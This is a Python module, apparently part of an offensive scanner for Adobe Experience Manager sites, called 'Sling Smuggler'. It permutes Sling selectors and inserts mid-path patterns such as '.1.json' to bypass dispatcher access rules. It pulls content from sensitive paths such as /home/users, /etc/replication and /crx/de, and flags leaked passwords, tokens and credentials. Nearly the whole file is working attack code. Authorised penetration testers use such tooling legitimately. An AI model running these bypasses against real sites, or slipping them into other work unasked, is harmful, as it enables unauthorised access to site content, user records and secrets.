"""Sling Smuggler — Advanced Path & Selector Permutation Engine.

Generates recursive permutations of AEM paths with:
- Selector chaining (.1.json, .tidy.json, .sysview.xml, .docview.xml, .pckg.zip)
- Internal servlet switching (.feed.xml, .search.json, .ext.json, .query.json)
- The "Dot-One" trick: insert .1. mid-path to bypass end-of-path dispatcher rules
- Deduplication and capped output per path
"""

import asyncio
import json
from typing import List, Dict, Set, Optional, Tuple
from itertools import product

from core.models import Finding, VulnSeverity, ScanPhase
from core.config import AEMConfig
from core.engine import HTTPXEngine
from bypass.transformers import BypassTransformer


class SlingSmuggler:
    """Advanced Sling path & selector permutation engine."""
    
    # Deep selectors for content extraction
    CONTENT_SELECTORS: List[str] = [
        ".1.json", ".2.json", ".3.json", ".5.json", ".10.json",
        ".-1.json", ".infinity.json",
        ".tidy.json", ".tidy.1.json", ".tidy.2.json", ".tidy.-1.json",
        ".sysview.xml", ".docview.xml",
        ".pckg.zip",
        ".res.tidy.json",
    ]
    
    # Internal servlet switching selectors
    SERVLET_SELECTORS: List[str] = [
        ".feed.xml",
        ".feed.json",
        ".search.json",
        ".ext.json",
        ".query.json",
        ".userinfo.json",
        ".permissions.json",
        ".pages.json",
        ".assets.json",
        ".tags.json",
        ".model.json",
        ".children.json",
        ".hierarchical.json",
        ".statistics.json",
        ".related.json",
        ".listorder.json",
        ".img.png",
        ".thumb.png",
        ".renditions.json",
    ]
    
    # "Dot-One" trick patterns — insert mid-path selectors
    DOT_ONE_PATTERNS: List[str] = [
        ".1.", ".children.", ".tidy.", ".infinity.",
        ".harray.", ".model.", ".res.", ".s7dam.",
    ]
    
    # Key paths to test permutations on
    TARGET_PATHS: List[str] = [
        "/content", "/content/dam", "/etc", "/etc/cloudservices",
        "/etc/replication", "/etc/workflow", "/home/users",
        "/home/groups", "/var/audit", "/var/replication",
        "/libs/granite", "/libs/cq", "/apps",
        "/bin/querybuilder.json", "/bin/wcm",
        "/system/console", "/crx/de",
    ]
    
    def __init__(self, engine: HTTPXEngine, config: AEMConfig, bypass: BypassTransformer):
        self.engine = engine
        self.config = config
        self.bypass = bypass
        self._seen_urls: Set[str] = set()
        self._max_per_path = 25
    
    async def run(self, base_url: str) -> List[Finding]:
        """Run the full Sling Smuggler permutation engine."""
        findings: List[Finding] = []
        
        # Phase A: Content selector permutations on all target paths
        selector_findings = await self._test_content_selectors(base_url)
        findings.extend(selector_findings)
        
        # Phase B: Internal servlet switching
        servlet_findings = await self._test_servlet_selectors(base_url)
        findings.extend(servlet_findings)
        
        # Phase C: Dot-One trick mid-path insertion
        dot_one_findings = await self._test_dot_one_trick(base_url)
        findings.extend(dot_one_findings)
        
        # Phase D: Recursive selector chaining on discovered content
        chain_findings = await self._recursive_selector_chain(base_url)
        findings.extend(chain_findings)
        
        return findings
    
    async def _test_content_selectors(self, base_url: str) -> List[Finding]:
        """Test content extraction selectors on target paths."""
        findings = []
        
        for path in self.TARGET_PATHS:
            tested = 0
            for selector in self.CONTENT_SELECTORS:
                if tested >= self._max_per_path:
                    break
                
                url = f"{base_url}{path}{selector}"
                if url in self._seen_urls:
                    continue
                self._seen_urls.add(url)
                tested += 1
                
                response = await self.engine.get_with_bypass_fallback(
                    url, base_url, f"{path}{selector}",
                    bypass_transformer=self.bypass,
                    max_bypass_attempts=10
                )
                
                if response.status_code == 200 and self._is_meaningful(response.text):
                    severity = self._assess_severity(path, selector, response.text)
                    findings.append(Finding(
                        phase=ScanPhase.DISCOVERY,
                        technique="Sling Smuggler: Content Selector",
                        url=response.url or url,
                        severity=severity,
                        title=f"Content Leak via {selector}: {path}",
                        description=f"Selector {selector} exposes content at {path}",
                        evidence={
                            "selector": selector,
                            "path": path,
                            "response_size": len(response.text),
                            "sample": response.text[:500],
                            "bypass_used": response.bypass_used,
                        },
                        bypass_used=None,
                        chainable=True
                    ))
        
        return findings
    
    async def _test_servlet_selectors(self, base_url: str) -> List[Finding]:
        """Test internal servlet switching selectors."""
        findings = []
        
        for path in self.TARGET_PATHS:
            tested = 0
            for selector in self.SERVLET_SELECTORS:
                if tested >= self._max_per_path:
                    break
                
                url = f"{base_url}{path}{selector}"
                if url in self._seen_urls:
                    continue
                self._seen_urls.add(url)
                tested += 1
                
                response = await self.engine.get_with_bypass_fallback(
                    url, base_url, f"{path}{selector}",
                    bypass_transformer=self.bypass,
                    max_bypass_attempts=10
                )
                
                if response.status_code == 200 and self._is_meaningful(response.text):
                    findings.append(Finding(
                        phase=ScanPhase.DISCOVERY,
                        technique="Sling Smuggler: Servlet Selector",
                        url=response.url or url,
                        severity=VulnSeverity.MEDIUM,
                        title=f"Internal Servlet via {selector}: {path}",
                        description=f"Servlet selector {selector} activates at {path}",
                        evidence={
                            "selector": selector,
                            "path": path,
                            "response_size": len(response.text),
                            "sample": response.text[:500],
                            "bypass_used": response.bypass_used,
                        },
                        chainable=True
                    ))
        
        return findings
    
    async def _test_dot_one_trick(self, base_url: str) -> List[Finding]:
        """Test the 'Dot-One' trick — insert selectors between path segments.
        
        E.g. /content.1.json/dam -> bypasses rules matching /content/dam
        """
        findings = []
        
        multi_segment_paths = [p for p in self.TARGET_PATHS if p.count("/") >= 2]
        
        for path in multi_segment_paths:
            parts = path.strip("/").split("/")
            
            for insert_pos in range(1, len(parts)):
                tested = 0
                for pattern in self.DOT_ONE_PATTERNS:
                    if tested >= 4:
                        break
                    
                    # Insert selector between segments
                    prefix = "/" + "/".join(parts[:insert_pos])
                    suffix = "/".join(parts[insert_pos:])
                    smuggled_url = f"{prefix}{pattern}json/{suffix}"
                    
                    full_url = f"{base_url}{smuggled_url}"
                    if full_url in self._seen_urls:
                        continue
                    self._seen_urls.add(full_url)
                    tested += 1
                    
                    response = await self.engine.get(full_url)
                    
                    if response.status_code == 200 and self._is_meaningful(response.text):
                        findings.append(Finding(
                            phase=ScanPhase.EXPLOITATION,
                            technique="Sling Smuggler: Dot-One Trick",
                            url=full_url,
                            severity=VulnSeverity.HIGH,
                            title=f"Dot-One Bypass: {path}",
                            description=(
                                f"Inserting {pattern} between path segments bypasses "
                                f"dispatcher rule for {path}"
                            ),
                            evidence={
                                "original_path": path,
                                "smuggled_url": smuggled_url,
                                "pattern": pattern,
                                "response_size": len(response.text),
                                "sample": response.text[:500],
                            },
                            chainable=True
                        ))
        
        return findings
    
    async def _recursive_selector_chain(self, base_url: str) -> List[Finding]:
        """Recursively chain selectors to probe deeper into content trees.
        
        E.g. /content.1.json -> find children -> /content/child.1.json -> ...
        """
        findings = []
        visited: Set[str] = set()
        queue: List[Tuple[str, int]] = [(p, 0) for p in self.TARGET_PATHS[:8]]
        
        while queue:
            path, depth = queue.pop(0)
            
            if depth > 2 or path in visited:
                continue
            visited.add(path)
            
            url = f"{base_url}{path}.1.json"
            if url in self._seen_urls:
                continue
            self._seen_urls.add(url)
            
            response = await self.engine.get(url)
            
            if response.status_code == 200:
                try:
                    data = json.loads(response.text)
                    if isinstance(data, dict):
                        # Extract child node names for deeper probing
                        children = [
                            k for k in data.keys()
                            if not k.startswith("jcr:") and ":" not in k
                            and isinstance(data.get(k), dict)
                        ]
                        
                        for child in children[:10]:
                            child_path = f"{path}/{child}"
                            if child_path not in visited:
                                queue.append((child_path, depth + 1))
                        
                        if children and depth > 0:
                            findings.append(Finding(
                                phase=ScanPhase.DISCOVERY,
                                technique="Sling Smuggler: Recursive Chain",
                                url=url,
                                severity=VulnSeverity.LOW,
                                title=f"Deep Child Discovery: {path}",
                                description=(
                                    f"Recursive selector chain found {len(children)} "
                                    f"children at depth {depth}"
                                ),
                                evidence={
                                    "path": path,
                                    "depth": depth,
                                    "children": children[:20],
                                    "child_count": len(children),
                                },
                                chainable=True
                            ))
                except (json.JSONDecodeError, KeyError):
                    pass
        
        return findings
    
    def _is_meaningful(self, text: str) -> bool:
        """Check if the response contains meaningful AEM/JCR data."""
        if len(text) < 10:
            return False
        indicators = [
            "jcr:primaryType", "sling:resourceType", "cq:", "nt:",
            "rep:", "items", "properties", "children", "<feed",
            "<entry", "totalMatches", "results", "hits",
        ]
        return any(ind in text for ind in indicators)
    
    def _assess_severity(self, path: str, selector: str, text: str) -> VulnSeverity:
        """Assess severity based on path, selector, and response content."""
        # Critical: sensitive paths with deep selectors
        sensitive_paths = ["/etc/replication", "/home/users", "/var/audit", "/etc/cloudservices"]
        deep_selectors = [".infinity.json", ".-1.json", ".sysview.xml", ".docview.xml"]
        
        if any(sp in path for sp in sensitive_paths):
            if any(ds in selector for ds in deep_selectors):
                return VulnSeverity.CRITICAL
            return VulnSeverity.HIGH
        
        # High: password or secret data in response
        secret_indicators = ["password", "secret", "apikey", "api_key", "token", "credential"]
        text_lower = text[:2000].lower()
        if any(si in text_lower for si in secret_indicators):
            return VulnSeverity.HIGH
        
        # Medium: any non-trivial JSON/XML data
        if selector in deep_selectors:
            return VulnSeverity.MEDIUM
        
        return VulnSeverity.LOW
